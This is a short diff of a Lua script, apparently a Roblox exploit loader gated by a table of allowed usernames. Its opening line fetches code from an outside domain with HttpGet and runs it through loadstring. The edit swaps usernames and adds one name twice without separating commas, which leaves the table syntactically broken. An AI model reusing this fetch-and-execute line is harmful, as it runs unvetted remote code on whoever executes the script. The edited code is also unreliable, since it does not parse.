@@ -1,8 +1,8 @@
 loadstring(game:HttpGet("https://shzwl.sbs/loaders/discordx2swnz.lua"))()
 local allowedUsers = {
-    ["vxgore_06"] = true,
-    ["phandung3614"] = true,
     ["demonkjq"] = true
+    ["vxgore_06"] = true
+    ["vxgore_06"] = true
 }
 local currentUserName = game.Players.LocalPlayer.Name
 
